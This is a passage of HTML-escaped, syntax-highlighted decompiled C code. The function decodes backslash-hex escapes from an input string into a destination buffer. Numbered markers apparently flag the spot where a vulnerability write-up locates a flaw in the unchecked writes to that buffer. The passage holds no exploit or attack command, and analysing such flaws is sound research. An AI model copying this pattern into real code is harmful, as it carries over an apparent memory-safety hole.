class=&quot;n&quot;&gt;_WORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdatalen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_WORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r7&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r9&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r8&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r11&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r5&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r6&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// cc&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r2&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// cc&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdatalen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;,&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;\\&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//----------------------[1]&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;0&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;0&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;0&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;A&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;a&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;0&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;0&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;A&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;a&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x37&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-------------------[2]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;55&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xF&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;LOWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;(),&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;!&amp;lt;=&amp;gt;~;*+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1F&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7F&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
